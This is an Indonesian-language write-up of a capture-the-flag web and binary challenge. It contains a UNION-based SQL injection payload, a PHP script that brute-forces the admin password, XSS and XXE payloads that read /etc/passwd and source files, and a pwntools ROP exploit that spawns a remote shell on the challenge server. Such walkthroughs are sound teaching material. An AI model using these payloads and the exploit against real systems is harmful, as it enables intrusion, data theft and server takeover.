# Write up 'Sorry we can't code any css syntax'

​	Halo akan membuat write up singkat dari challenge ini. Challenge ini dibuat oleh username telegram `@ytyao` Terima Kasih challengenya!



## Pertama

​	Diberika sebuah challenge pada Group Telegram, Surabaya Hacker Link (SHL) dengan format yang diberikan seperti ini

```Challenge name : Sorry we can't code any css syntax
target        : 68.183.231.170
source if need : https://github.com/nikkoenggaliano/We-Bad-at-css
write you name maybe need root this server? Just do!
provided by @Ytyao
```



Saat ip tersebut dibuka pada browser. Hanya menampilkan text berikut



```
solver:

>>> 
```



Hanya page untuk seseorang yang dapat menuliskan namanya pada server tersebut. Karena kita diberi sebuah source pada githubnya, Mari kita teliti.

### Vulnerability pada Source

Ditemuka beberapa Vulnerability pada source yang diberikan pada github itu. Kami petakan sebagai berikut.



#### No CSRF token pada setiap form

Pada setiap form yang ada pada file `regis.php` dan `index.php` Tidak ada CSRF token, Jadi kita dapat melakukan post data secara automatis jika memang diperlukan atau singkatnya kita bisa `curl` `POST` data untuk login maupun register.



#### SQL Injection

Terdapat Possible SQLi pada file `dashboard.php` Menurut saya SQLi ini sangat tricky karena stuktur kodenya yang vuln seperti ini. 

`$query = "SELECT * from users WHERE username = '{$_SESSION['username']}'";`

Variable Session username langsung di exekusi sebagai query. Namun kita tidak bisa langsung mengontrol isi dari session username ini.



#### Execution after redirect

Pada file `/admin/markdown.php` EAR yang kita dapat melakukan curl pada file tersebut dan mendapatkan source clientnya, Tapi kita tidak bisa melakukan exploitasi dikarenakan pada file tersebut ternyata diberi CSRF token. Kode yang ngebug sebagai berikut

```php
if(!isset($_SESSION['username'])){
	header("location: index.php");
	//exit;
}
```

Kita seharusnya diredirect ke `index.php` jika tidak memiliki session username. Namun pada kode selanjutnya fungsi `exit;` dicommenting sehingga tidak berlaku. 



#### Credential File Expose

Pada `.gitignore` kita bisa melihat beberapa file dan folder tidak dicommit. Yang kita tahu adalah file `*.sql`  ikut dimasukan ke web, namuk kita tidak mengetahui namanya jadi tidak bisa men-direct download. Dan ada folder `lib` yang selalu tidak diikut commitkan yang harusnya berisi file file penting.



# Exploitasi

​	Pada tahap ini kita akan coba mulai melakukan attacking pada target, Dan mulai mencocokan pada isi dari setiap source kode yang diberikan.



## Reconnaissance

Karena kita diberikan sebuah ip host. Maka kita pertama harus mengetahui apa saja isi dari IP host ini. Oke kita akan melakukan scanning mengunakan `nmap`

### Scanning

Kita melakukan scanning mengunakan `nmap` dan beberapa tools lain jika `nmap` kurang memberi hasil.

Untuk nmap bisa kalian download di website resminya. nmap.org



```bash
>nmap -A 68.183.231.170
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-13 08:40 SE Asia Standard Time
Nmap scan report for 68.183.231.170
Host is up (0.015s latency).
Not shown: 994 closed ports
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:79:69:26:b5:c2:15:a9:1e:ea:61:61:e6:3c:83:24 (RSA)
|   256 15:d3:eb:d9:09:e5:c8:92:0e:ec:fa:a7:05:5e:2a:25 (ECDSA)
|_  256 6f:32:12:b2:15:5f:49:6f:00:85:eb:f7:45:e0:59:3d (ED25519)
25/tcp   filtered smtp
80/tcp   open     http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
81/tcp   open     http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login
82/tcp   open     http       Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login>nmap -A 68.183.231.170
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-13 08:40 SE Asia Standard Time
Nmap scan report for 68.183.231.170
Host is up (0.015s latency).
Not shown: 994 closed ports
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:79:69:26:b5:c2:15:a9:1e:ea:61:61:e6:3c:83:24 (RSA)
|   256 15:d3:eb:d9:09:e5:c8:92:0e:ec:fa:a7:05:5e:2a:25 (ECDSA)
|_  256 6f:32:12:b2:15:5f:49:6f:00:85:eb:f7:45:e0:59:3d (ED25519)
25/tcp   filtered smtp
80/tcp   open     http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
81/tcp   open     http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login
82/tcp   open     http       Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login

```

Ada beberapa port yang terbuka. 

22 -> ssh

25 -> smtp

80 -> http

81 -> http

82 -> http



Ada 3 http terbuka. Yang `80` kita sudah pastikan adalah sebuah page berisi name solver.

`81` dan `82` Sama sama memiliki http-title `login` Mari kita lihat port `81`

![1547343954520](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1547343954520.png)

Pada port `81` jika disamakan dengan sourcenya ini adalah file `index.php` dan `regis.php` jika kita menekan `register here`.



Kita lihat port `82`

![1547344029243](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1547344029243.png)

Pada login form tersebut tidak ada register here, bisa dipastikan ini adalah folder `/admin` 



### Gaining Access



Pada port 81 kita diawal sudah memetakan terdapat SQLi jadi kita sekarang mencoba memanfaatkan bug ini. Di awal tadi SQLi terdapat pada session username, namun kita tidak bisa mengontrol sebuah session.



Pada file `index.php` session username di kontrol.

```php
if(mysqli_num_rows($login) > 0) {
			session_start();
			$_SESSION['username'] = $_POST['username'];
			header("location: dashboard.php");
		}
```



Jika session username diisi dari inputan kita jika memang ada di database. Idenya berati kita harus register. Basic testing kita akan register dengan `%27` dengan password 10 digit.



![1547344591933](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1547344591933.png)

Yap benar seperti dugaan saya. Isi dari post data login kita akan langsung dirender, Error sql terlihat. Kita tinggal mendump isi dari databasenya. Namun kita TIDAK BISA menggunakan sqlmap.py :(( 



Skip skip susunan payloadnya adalah seperti ini.

`'union select 1,concat(id,0x3a,username,0x3a,password),3 from users#`

Pada saat login ada sebuah proteksi client side yang mana kita hanya bisa menginputkan max 20 karakter pada form username.

![1547344830365](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1547344830365.png)

 

Kita tinggal mengedit nya menjadi 100 dan leluasa kembali menginputkan payload yang panjang.

![1547344911137](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1547344911137.png)

Iyap dan kita sudah bisa mendump isi dari databasenya. Mari kita melihat login form dari /admin/index.php



`$id = ((7^1)*10)+100>>1<<5;` Terdapat sebuah logic matematika seperti berikut. Mari kita lihat menghasilkan nilai berapa. 

```python
>>> ((7^1)*10)+100>>1<<5
2560
```

Dan pada file itu ternyata logicnya di delete dan hanya meninggalkan sebuah fungsi encryption. Namun yang penulis bisa pastikan adalah file itu sama dengan yang lain sama sama terfilter dari SQLi . Oke dengan id = 2560 yang di asumsikan adalah id milik admin kita tinggal mencari nya.



``2560:Sanhok:+LVJRyyuWZcdeyGnWV0HYthYz7CgDTX6`



Pada data itu id admin 2560 dan username Sanhok dan password yang terhash tidak dengan md5 seperti yang lain.



### Crack the password

Setelah mendapatkan password aneh di user Sanhok, lalu selanjutnya adalah gimana caranya kita dapet plain dari password tersebut. Karena penyedia soal lumayan baik dan ngasih source code, nah kalo kalian ngubek-ngubek repositorynya, kalian bakal nemu satu function di file [/admin/index.php]. Berikut isi function-nya
```php
function encrypt($plain) {    
  $now = str_split(time(), 2)[rand(0,4)];
  $rand = substr(md5(microtime()),rand(0,26),2);
  $raw = "\$_pass_" . $plain;
    
  $res = "";
  for($i=0; $i<strlen($raw); $i++) {
    $res .= dechex(ord($raw[$i]) ^ $now);
  }
  $enc_method = "AES-256-CBC";
  $enc_key = $rand;
  $enc_iv = str_repeat($rand,8);
  $enc_res = openssl_encrypt($res,$enc_method,$enc_key,0,$enc_iv);
  return $enc_res;
}
```
Rumit ? Ah gak juga sih sebenere. Oh iya, ngomong-ngomong bentuk passwordnya adalah `+LVJRyyuWZcdeyGnWV0HYthYz7CgDTX6`. Kalau dari potongan kode diatas, bentuk tersebut merupakan hasil dari `openssl_encrypt`. Mudeng ya ? Mudeng lanjut, mubeng turu.
Mari breakdown satu-satu fungsi diatas, 
#### Bagian Pertama
Untuk yang bagian pertama, mari lihat 3 baris paling atas, dari variabel `$now` sampai variabel `$raw`
```php
$now = str_split(time(), 2)[rand(0,4)];
$rand = substr(md5(microtime()),rand(0,26),2);
$raw = "\$_pass_" . $plain;
```
Disana ada 3 buah variabel `$now`,`$rand`, dan `$raw`. Variabel `$now` berisi 2 angka random yang diambil dari epoch-time waktu password digenerate
```sh
$ php artisan tinker
Psy Shell v0.9.9 (PHP 7.2.12 — cli) by Justin Hileman
>>> str_split(time(), 2)[rand(0,4)];
=> "65"
```
Paham, jadi kita sudah tau isi dari variabel `$now`. Selanjutnya adalah variabel `$rand`, sebenarnya isinya juga 2 karakter random yang diambil dari hasil `md5(microtime())`. Tapi bedanya di variabel ini, mengandung karakter hexadesimal yaitu `0-9a-f`
```sh
>>> substr(md5(microtime()),rand(0,26),2);
=> "f8"
```
Lanjut, terakhir adalah variabel `$raw` yang isinya adalah menambahkan awalan `$_pass_` sebelum password. Jadi misalnya password kita adalah `s3cr3tp4ss`, maka di variabel ini menjadi `$_pass_s3cr3tp4ss`. Lalu tujuannya menambahkan awalan untuk apa ? Sabar nanti dulu.
#### Bagian Kedua
Sebenarnya tidak ada yang spesia disini, hanya ada sebuah perulangan, operasi XOR, dan konversi ke hexadesimal biasa
```php
$res = "";
for($i=0; $i<strlen($raw); $i++) {
  $res .= dechex(ord($raw[$i]) ^ $now);
}
```
Bener kan, nggak ada yang spesial ? Potongan kode diatas hanya mengulang isi dari password, lalu tiap karakter akan di-xor dengan isi dari variabel `$now` tadi, lalu hasilnya akan di-encode ke bentuk hexadecimal. Lalu semua hasilnya akan dimasukkan ke variabel `$res`. Jadi bentuk akhirnya adalah hexadecimal
```sh
>>> $now = str_split(time(), 2)[rand(0,4)];
=> "86"
>>> $rand = substr(md5(microtime()),rand(0,26),2);
=> "92"
>>> $raw = "\$_pass_" . "sup3rs3cr3t";
=> "$_pass_sup3rs3cr3t"
>>> $res = "";
=> ""
>>> for($i=0; $i<strlen($raw); $i++) {
... $res .= dechex(ord($raw[$i]) ^ $now);
... }
>>> $res
=> "7292637252592523266524256535246522"
```
Kira-kira begitulah alur dari bagian kedua ini.
#### Bagian Ketiga
Bagian ini juga simple, hanya ada proses enkripsi dengan menggunakan metode `AES-256-CBC`. Mungkin yang sedikit menarik disini adalah pembuatan dari `iv` yang ada di variabel `$enc_iv`
```php
$enc_method = "AES-256-CBC";
$enc_key = $rand;
$enc_iv = str_repeat($rand,8);
$enc_res = openssl_encrypt($res,$enc_method,$enc_key,0,$enc_iv);
return $enc_res;
```
Pertama, di variabel `$enc_key` untuk key yang digunakan saat proses enkripsi diambil dari variabel `$rand` yang sudah dibahas pada bagian pertama. Selanjutnya pada variabel `$enc_iv` yang digunakan sebagai `iv` saat proses enkripsi didapatkan dari pengulangan `$enc_key` sebanyak 8 kali sehingga menjadi 16 karakter.
```sh
>>> $enc_key = $rand;
=> "92"
>>> $enc_iv = str_repeat($rand,8);
=> "9292929292929292"
```
Lalu setelah sudah didapatkan nilai dari `key` dan `iv`, akan dilakukan enkripsi dengan metode `AES-256-CBC`
Penjelasan function selesai, mari buat script sederhana untuk melakukan bruteforce terhadap nilai `$now` dan `$rand`. Awalnya saya ingin membuat 4 karakter random, supaya bruteforce-nya seru. Tapi lagi-lagi si pembuat soal memberikan keringanan dengan 2 karakter random saja :(
#### Breaking the Password
Disini saya menggunakan script PHP sederhana untuk melakukan bruteforce nilai `$now` dan `$rand`. Pertama saya buat file `generate.php` untuk generate 2 karakter dari aa sampai 99
```php
$charpool = "abcdef0123456789";
for($i=0; $i<strlen($charpool); $i++) {
  for($j=0; $j<strlen($charpool); $j++) {
        echo $charpool[$i] . $charpool[$j] . "\n";
  }
}
```
```sh
$ php generate.php > list.txt
$ cat list.txt
aa
ab
ac
ad
ae
-- snip --
95
96
97
98
99
```
Selesai dengan karakter random, lalu saya membuat file dengan nama `crack.php` dengan isi sebagai berikut
```php
function decrypt($encrypted, $enc_key) {
  $enc_method = "AES-256-CBC";
  $enc_iv = str_repeat($enc_key,8);
  $out = openssl_decrypt($encrypted,$enc_method,$enc_key,0,$enc_iv);
  return $out;
}
function crack($encrypted) {
  // step 1
  $decrypted = "";
  $list = explode("\n",fread(fopen("list.txt","r"),filesize("list.txt")));
  foreach($list as $key) {
    $dec = decrypt($encrypted,$key);
    if(strlen($dec) > 0) {
      if(ctype_print($dec)) {
        $decrypted = $dec;
      }
    }
  }
   // step 2
  $fragment = str_split($decrypted,2);
  for($i=0; $i<99; $i++) {
    $final = "";
    foreach($fragment as $anu) {
      $final .= chr(hexdec($anu) ^ $i);
    }
    if(substr($final,0,7) == "\$_pass_") {
      echo substr($final,7);
    }
  }
}
crack("+LVJRyyuWZcdeyGnWV0HYthYz7CgDTX6HIpSujJSNvr/2JybBc6a0qj6J8El3sKF");
echo "\n";
```
Pada `step 1`, ada bruteforce key pada proses dekripsi dengan menggunakan list hasil file `generate.php` tadi. Apabila pada proses bruteforce ada strings yang `printable` maka akan masuk ke variabel `$decrypted`. Setelah mendapatkan hasil hexadecimal-nya, selanjutnya hexadecimal tesebut akan dipisah tiap 2 karakter. Hal ini bertujuan untuk mengembalikan bentuk dri hexadecimal ke decimal. Setelah dipisah tiap 2 karakter dan diconvert ke bentuk decimal, maka akan dilakukan bruteforce operasi XOR sebanyak 2 digit (dari 0 sampai 99). Nah, pada saat proses bruteforce nilai XOR ini, apabila ada indikasi string berupa "$_pass_xxx", maka passwordnya adalah xxx. Mari coba jalankan script tersebut
```sh
$ php crack.php 
AyoMudunPocinki
```
Ternyata ketemu passwordnya adalah `AyoMudunPocinki`



Kita coba login dan tara ~

![1547345265819](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1547345265819.png)

### XSS for fun

Pada fitur markdown parse

![1547345309513](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1547345309513.png)

Inputan kita langsung dirender. Memungkinkan kita bisa menginputkan hal hal menarik seperti tag HTML dan javascript syntax.



![1547345379748](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1547345379748.png)



Yeahhh! Kita coba  melakukan basic xss payload. `<script>alert('Nikko')</script>`

![1547345501356](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1547345501356.png)



Yeahhhh bisa. Tapi ya karena ini self xss jadi xss yang tertrigger di diri kita sendiri, Tidak bisa di exploitasi lebih jauh. :(



### XXE for Profit

Pada fitur XML parse kita diberikan sebuat XML dan langsung di parse bagian <user> nya 

![1547345977816](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1547345977816.png)

Kita bisa mencoba basic payload XXE seperti ini.



```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY **xxe** SYSTEM **"file:///etc/passwd"** >]>
<creds>
    <user>**&xxe;**</user>
    <pass>mypass</pass>
</creds>
```



Woopssss Jadi :D 



![1547346121495](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1547346121495.png)

Nah dari XXE ini kita bisa melakukan RCE namun dengan step yang sangat rumit, Maka pembuat soal mempermudah prosess gain aksesnya, Namun tidak memberi tau mempermudahnya seperti apa :3 



Mari kita rubah payload kita menjadi 



```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

Kita menggunakan wrapper PHP dengan mengconver isi dari index.php ke base64

![1547346687021](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1547346687021.png)

Hmm success.

![1547346729034](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1547346729034.png)



Hasi decodenya seperti itu dan hal yang menarik ada ./lib.db.php mari kita dapatkan sourcenya.



![1547346784773](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1547346784773.png)

![1547346804352](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1547346804352.png)



Hmmm di db.php masih mengiclude config.php mari kita dapatkan config.php



![1547346843525](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1547346843525.png)

![1547346867358](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1547346867358.png)



Nah disitu didapatkan ada sebuah info dari sang pembuat soal. Mungkin ini yang disebut lebih dipermudah.



# Pwn The Server

​	Pada tahan ini kita sudah hampir mendapatkan akses kedalam servernya. Mari kita lanjutkan step-stepnya.



## Exploit Development

Pertama kita download binarynya. 

```
wget http://68.183.231.170/binary && chmod +x binary
```



Mendapatkan info dari binarynya.

```
# file binary
binary: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7f08aacdce62a66a77070ac6f7d1bfdc453b67f0, not stripped
```

Binary itu adalah file 32 bit not striped. Mari kita coba jalankan.

```
./binary
Selamat datang selamat berbelanja
Mau beli apa kak?
Jajanan Jepang
Pesananan anda Jajanan Jepang
```

File tersebut meminta sebuah inputan, Dan memprint inputan kita dan exit.



### Debug for fun

Kita coba mendebug file tersebut.

```
# gdb -q ./binary
Reading symbols from ./binary...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
gdb-peda$
```

Configuration filenya seperti itu. Tanpa proteksi apapun



```
gdb-peda$ info function
All defined functions:

Non-debugging symbols:
----snip----
0x0804851b  here
0x0804852e  main
----snip----
gdb-peda$
```



Disitu ada 2 fungsi utama yang didefine. 

```assembly
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x0804852e <+0>:     push   ebp
   0x0804852f <+1>:     mov    ebp,esp
   0x08048531 <+3>:     sub    esp,0x40
   0x08048534 <+6>:     mov    eax,ds:0x804a040
   0x08048539 <+11>:    push   0x0
   0x0804853b <+13>:    push   0x2
   0x0804853d <+15>:    push   0x0
   0x0804853f <+17>:    push   eax
   0x08048540 <+18>:    call   0x8048400 <setvbuf@plt>
   0x08048545 <+23>:    add    esp,0x10
   0x08048548 <+26>:    mov    eax,ds:0x804a044
   0x0804854d <+31>:    push   0x0
   0x0804854f <+33>:    push   0x2
   0x08048551 <+35>:    push   0x0
   0x08048553 <+37>:    push   eax
   0x08048554 <+38>:    call   0x8048400 <setvbuf@plt>
   0x08048559 <+43>:    add    esp,0x10
   0x0804855c <+46>:    push   0x8048620
   0x08048561 <+51>:    call   0x80483d0 <puts@plt>
   0x08048566 <+56>:    add    esp,0x4
   0x08048569 <+59>:    push   0x8048642
   0x0804856e <+64>:    call   0x80483d0 <puts@plt>
   0x08048573 <+69>:    add    esp,0x4
   0x08048576 <+72>:    lea    eax,[ebp-0x40]
   0x08048579 <+75>:    push   eax
   0x0804857a <+76>:    call   0x80483c0 <gets@plt>
   0x0804857f <+81>:    add    esp,0x4
   0x08048582 <+84>:    lea    eax,[ebp-0x40]
   0x08048585 <+87>:    push   eax
   0x08048586 <+88>:    push   0x8048654
   0x0804858b <+93>:    call   0x80483b0 <printf@plt>
   0x08048590 <+98>:    add    esp,0x8
   0x08048593 <+101>:   mov    eax,0x0
   0x08048598 <+106>:   leave
   0x08048599 <+107>:   ret
End of assembler dump.
gdb-peda$
```

Inputan kita dialokasikan pada `ebp-0x40` dan inputan kita diterima oleh fungsi `gets` yang bisa dipastikan `BOF` 

```assembly
gdb-peda$ pdisas here
Dump of assembler code for function here:
   0x0804851b <+0>:     push   ebp
   0x0804851c <+1>:     mov    ebp,esp
   0x0804851e <+3>:     push   0x804a04c
   0x08048523 <+8>:     call   0x80483e0 <system@plt>
   0x08048528 <+13>:    add    esp,0x4
   0x0804852b <+16>:    nop
   0x0804852c <+17>:    leave
   0x0804852d <+18>:    ret
End of assembler dump.
```

Pada fungsi `here` ada sebuah system yang mengeksekusi sebuah variable yang kosong. 



Jika di representasikan mungkin seperti ini


```c
char bla[100];

void here(){

system(bla);

}

int main(){

char x[ebp-0x40];

gets(x);

}

```

```assembly
gdb-peda$ info variables
All defined variables:

Non-debugging symbols:
0x08048618  _fp_hw
0x0804861c  _IO_stdin_used
0x08048668  __GNU_EH_FRAME_HDR
0x08048778  __FRAME_END__
0x08049f08  __frame_dummy_init_array_entry
0x08049f08  __init_array_start
0x08049f0c  __do_global_dtors_aux_fini_array_entry
0x08049f0c  __init_array_end
0x08049f10  __JCR_END__
0x08049f10  __JCR_LIST__
0x08049f14  _DYNAMIC
0x0804a000  _GLOBAL_OFFSET_TABLE_
0x0804a024  __data_start
0x0804a024  data_start
0x0804a028  __dso_handle
0x0804a02c  __TMC_END__
0x0804a02c  __bss_start
0x0804a02c  _edata
0x0804a040  stdin
0x0804a040  stdin@@GLIBC_2.0
0x0804a044  stdout
0x0804a044  stdout@@GLIBC_2.0
0x0804a048  completed
0x0804a04c  shell
0x0804a058  _end
gdb-peda$
```



Ada sebuah global variable `shell` yang mungkin di eksekusi oleh fungsi system di `here` 



### BOF for profit

Karena kita sudah bisa memetakan binary ini kita tinggal mengeksploitasinya. Pertama kita cari tau jarak antara `ebp-0x40` sampai `eip` 



```
gdb-peda$ b*main+106
gdb-peda$ r
---snip---
gdb-peda$ distance $ebp-0x40 $ebp+4
From 0xffffd628 to 0xffffd66c: 68 bytes, 17 dwords
---snip---

```



Jarak antara inputan sampai menyentuh eip adalah 68 byte. Jadi jumlah junknya adalah 68.

```
# python -c "print('a')*68" | ./binary
Selamat datang selamat berbelanja
Mau beli apa kak?
Pesananan anda aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```

Okay. 



### ROP and get the Shell

Ide dari exploit ini adalah

Junk sampai menyentuh eip -> mengisi eip dengan `gets` -> memanggil fungsi `here` -> mengisi variable `shell` dengan sesuatu.



Junk

alamat gets

alamat here

alamat shell

shell



Jadi `gets` akan mengisi `shell` dengan shell jadi kita tinggal mempush `/bin/sh` saat gets dicall.



#### Final Payload

```python
from pwn import *

#r = process("./binary")
r  = remote("68.183.231.170", 1335)
payload = ""
payload += "A"*68
payload += p32(0x80483c0)
payload += p32(0x0804851b)
payload += p32(0x0804a04c)
r.sendline(payload)
r.sendline("/bin/sh\x00")
r.interactive()
```



#### Shell and write solver name.

```
[+] Opening connection to 68.183.231.170 on port 1335: Done
[*] Switching to interactive mode
$ id
uid=1000(jhoni) gid=1000(jhoni) groups=1000(jhoni)
$ pwd
/home/jhoni
$ ls solver
binary    index.html  index.html.save
$ cd solver
$ pwd
/home/jhoni/solver
$ ls
binary    index.html  index.html.save
$ cat index.html
<html>
<body>
<pre><code>solver:

>>>
</code></pre>
$
```

